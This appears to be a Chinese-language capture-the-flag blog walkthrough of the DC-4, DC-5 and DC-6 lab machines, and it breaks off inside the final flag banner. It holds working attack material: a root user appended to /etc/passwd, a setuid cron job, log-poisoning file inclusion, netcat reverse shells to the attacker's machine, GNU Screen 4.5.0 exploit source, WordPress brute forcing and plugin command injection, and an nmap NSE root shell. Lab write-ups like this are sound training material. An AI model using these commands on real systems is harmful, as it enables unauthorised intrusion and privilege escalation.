<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc<span class="literal">-4</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc<span class="literal">-4</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># teehee --help #查看teehee的用法</span></span><br><span class="line">Usage: teehee [<span class="type">OPTION</span>]... [<span class="type">FILE</span>]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  <span class="literal">-a</span>, -<span class="literal">-append</span>              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  <span class="literal">-i</span>, -<span class="literal">-ignore</span><span class="literal">-interrupts</span>   ignore interrupt signals</span><br><span class="line">  <span class="literal">-p</span>                        diagnose errors writing to non pipes</span><br><span class="line">      -<span class="literal">-output</span><span class="literal">-error</span>[=<span class="type">MODE</span>]   set behavior on write error.  See MODE below</span><br><span class="line">      -<span class="literal">-help</span>     display this help and <span class="keyword">exit</span></span><br><span class="line">      -<span class="literal">-version</span>  output version information and <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#teehee -a 表示写入文件，但是不会覆盖，所以可以通过写入一个root用户来执行root权限</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> echo <span class="string">"admin::0:0:admin::/bin/bash"</span>|sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">admin::<span class="number">0</span>:<span class="number">0</span>:admin::/bin/bash  <span class="comment">##[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> su admin</span><br><span class="line">root@dc<span class="literal">-4</span>:/home/charles<span class="comment"># cd /root</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> cat /etc/crontab</span></span><br><span class="line"><span class="string"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="string"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="string"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="string"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="string"># that none of the other crontabs do.</span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo  "</span>* * * * * root chmod <span class="number">4777</span> /bin/sh<span class="string">" | sudo teehee -a /etc/crontab</span></span><br><span class="line"><span class="string">#时间部分全部填写为*，默认这个定时任务每分钟执行一次</span></span><br><span class="line"><span class="string">#通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> /bin/sh</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls /root</span></span><br><span class="line"><span class="string">flag.txt</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-5渗透过程"><a href="#DC-5渗透过程" class="headerlink" title="DC-5渗透过程"></a><strong>DC-5渗透过程</strong></h2><p><strong>看了下网站首页没啥切入点，爆破下后台路径，发现了两个新路径</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># dirb http://192.168.126.155/ -X .php -S</span></span><br><span class="line">URL_BASE: http://<span class="number">192.168</span>.<span class="number">126.155</span>/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt <span class="comment">#默认字典</span></span><br><span class="line">---- Scanning URL: http://<span class="number">192.168</span>.<span class="number">126.155</span>/ ----</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/ab<span class="built_in">out-us</span>.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4292</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/contact.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4282</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/faq.php (CODE:<span class="number">200</span>|SIZE:<span class="number">5645</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/footer.php (CODE:<span class="number">200</span>|SIZE:<span class="number">17</span>)  <span class="comment">#隐藏路径</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/index.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4025</span>)</span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/solutions.php (CODE:<span class="number">200</span>|SIZE:<span class="number">4100</span>) </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php (CODE:<span class="number">200</span>|SIZE:<span class="number">852</span>)  <span class="comment">#隐藏路径</span></span><br></pre></td></tr></table></figure>

<p><strong>提示thankyou.php存在文件包含漏洞，测试下发现确实可以，查看日志文件，可以写入一句话木马</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php?file=../../../etc/passwd</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.155</span>/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p><strong>写入payload到日志，因为错误的请求会写入error.log，查看日志，成功插入，蚁剑连接成功！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/4.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/5.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/3.png" alt></p>
<p><strong>可以在本地再上传一句话木马文件，方便连接！用虚拟终端反弹shell到主机上</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(www<span class="literal">-data</span>:/var/www/html) <span class="variable">$</span> nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvvp 2333</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">126.155</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.126.33</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.126.155</span>] <span class="number">47749</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">'import pty;pty.spawn("/bin/bash")'</span>  </span><br><span class="line"></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:~/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null <span class="comment">#查看sudo权限</span></span><br><span class="line">/bin/screen<span class="literal">-4</span>.<span class="number">5.0</span>  <span class="comment">#发现了一个可能可以利用的文件</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">41154</span>.sh</span><br><span class="line">GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation (PoC)                                        | exploits/linux/local/<span class="number">41152</span>.txt</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># searchsploit -m 41154.sh  #把一个exp拷贝到当前工作目录,参数后加目标id</span></span><br><span class="line">  Exploit: GNU Screen <span class="number">4.5</span>.<span class="number">0</span> - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit<span class="literal">-db</span>.com/exploits/<span class="number">41154</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/<span class="number">41154</span>.sh</span><br><span class="line">File Type: Bourne<span class="literal">-Again</span> shell script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/<span class="number">41154</span>.sh</span><br></pre></td></tr></table></figure>

<p><strong>按照exp的说明进行操作编译，上传至靶机，注意只能上传到/tmp目录下，执行即可提权</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># vi libhax.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    printf(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">root@kali:/tmp<span class="comment"># gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span></span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># vi rootshell.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">root@kali:/tmp<span class="comment"># gcc -o /tmp/rootshell /tmp/rootshell.c</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools<span class="comment"># cat 41154.sh  #将剩下的写入</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">echo <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span> <span class="comment"># because</span></span><br><span class="line">screen <span class="literal">-D</span> <span class="literal">-m</span> <span class="literal">-L</span> ld.so.preload echo <span class="operator">-ne</span>  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line">echo <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen <span class="literal">-ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line"></span><br><span class="line">root@kali:~/tools<span class="comment"># ls</span></span><br><span class="line"><span class="number">41154</span>.sh    libhax.so   rootshell</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过蚁剑上传至/tmp目录下</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> chmod +x <span class="number">41154</span>.sh</span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> ./<span class="number">41154</span>.sh</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">[+] Triggering...</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># cat thisistheflag.txt</span></span><br><span class="line"><span class="string">cat thisistheflag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888b    888 d8b                                                      888      888 888 888 </span></span><br><span class="line"><span class="string">8888b   888 Y8P                                                      888      888 888 888 </span></span><br><span class="line"><span class="string">88888b  888                                                          888      888 888 888 </span></span><br><span class="line"><span class="string">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 </span></span><br><span class="line"><span class="string">888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 </span></span><br><span class="line"><span class="string">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P </span></span><br><span class="line"><span class="string">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  </span></span><br><span class="line"><span class="string">888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 </span></span><br><span class="line"><span class="string">                                                                                          </span></span><br><span class="line"><span class="string">                                                                                         </span></span><br><span class="line"><span class="string">Once again, a big thanks to all those who do these little challenges,</span></span><br><span class="line"><span class="string">and especially all those who give me feedback - again, it'</span>s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-6渗透过程"><a href="#DC-6渗透过程" class="headerlink" title="DC-6渗透过程"></a><strong>DC-6渗透过程</strong></h2><p><strong>nmap发现打开了22/80端口，whatweb查看指纹信息，发现是wordpress系统，而且存在重定向，设置地址解析，用dirb爆破后台路径，wpscan扫描网站用户，提示用对应的密码本，爆破得到账户密码！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># whatweb  -v 192.168.126.156  #详细扫描输出</span></span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://<span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Status    : <span class="number">301</span> Moved Permanently</span><br><span class="line">Title     : &lt;None&gt;</span><br><span class="line">IP        : <span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line">...</span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://wordy/</span><br><span class="line">Status    : <span class="number">200</span> OK</span><br><span class="line">Title     : Wordy &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">IP        : <span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line">Summary   : Script[<span class="type">text</span>/<span class="type">javascript</span>], PoweredBy[<span class="type">WordPress</span>], WordPress[<span class="number">5.1</span><span class="type">.1</span>], MetaGenerator[<span class="type">WordPress</span> <span class="number">5.1</span><span class="type">.1</span>], HTTPServer[<span class="type">Debian</span> <span class="type">Linux</span>][<span class="type">Apache</span>/<span class="number">2.4</span><span class="type">.25</span> (<span class="type">Debian</span>)], UncommonHeaders[<span class="type">link</span>], Apache[<span class="number">2.4</span><span class="type">.25</span>], JQuery[<span class="number">1.12</span><span class="type">.4</span>], HTML5</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://wordy  -e u  #发现存在用户</span></span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp<span class="literal">-json</span>/wp/v2/users/?per_page=<span class="number">100</span>&amp;page=<span class="number">1</span></span><br><span class="line">[+] graham</span><br><span class="line">[+] mark</span><br><span class="line">[+] sarah</span><br><span class="line">[+] jens</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dirb http://wordy  #爆破后台路径</span></span><br><span class="line">URL_BASE: http://wordy/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">---- Entering directory: http://wordy/wp<span class="literal">-admin</span>/network/ ----</span><br><span class="line">+ http://wordy/wp<span class="literal">-admin</span>/network/admin.php (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)                                                </span><br><span class="line">+ http://wordy/wp<span class="literal">-admin</span>/network/index.php (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据提示，选择此密码本（含有k01的密码）</span></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#用wpscan进行尝试，花费的时间有点久，成功爆破！</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://wordy/wp-login.php   -U dc_use.txt -P passwords.txt               </span></span><br><span class="line">[<span class="type">SUCCESS</span>] - mark / helpdesk01</span><br></pre></td></tr></table></figure>

<p><strong>拿到mark用户的密码以后，登陆到后台，没啥头绪，看了下别人的博客，说是存在active管理插件命令执行漏洞</strong></p>
<p><strong>searchsploit下此漏洞，发现存在，抓包修改反弹shell链接kail！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit activity monitor</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Activity Monitor 2002 2.6 - Remote Denial of Service                                       | exploits/windows/dos/22690.c</span><br><span class="line">RedHat Linux 6.0/6.1/6.2 - 'pam_console' Monitor Activity After Logout                     | exploits/linux/local/19900.c</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection   | exploits/php/webapps/45274.html</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~# cat /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br><span class="line">About:</span><br><span class="line">===========</span><br><span class="line">Component: Plainview Activity Monitor (Wordpress plugin)</span><br><span class="line">Vulnerable version: 20161228 and possibly prior</span><br><span class="line">Fixed version: 20180826</span><br><span class="line">CVE-ID: CVE-2018-15877</span><br><span class="line">CWE-ID: CWE-78</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/7.png" alt></p>
<p><strong>进入服务器后，查找提示，发现了graham的账号和密码，ssh连接登陆graham！查看下权限，发现jens用户可以执行root权限，将反弹shell写入backups.sh，并以jens用户执行，成功反弹！得到jens用户，再次查看root权限，发现jens可以以root执行nmap命令</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt</span><br><span class="line">cat things-to-do.txt</span><br><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah's farewell party</span><br><span class="line">- Add new user: graham -GSo7isUM1D4 ye's - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah's replacement</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">写入反弹shell</span></span><br><span class="line">graham@dc-6:/home/jens$ echo nc 192.168.126.33 1324 -e /bin/bash &gt; backups.sh </span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">发现nmap可以提权</span></span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">编写一个nmap的脚本，执行反弹shell得到root</span></span><br><span class="line">echo 'os.execute("/bin/sh")' &gt;  chj.nse</span><br><span class="line">sudo nmap --script=/home/jens/chj.nse</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-18 17:36 AEST</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">cd /root</span><br><span class="line">ls  </span><br><span class="line">theflag.txt</span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  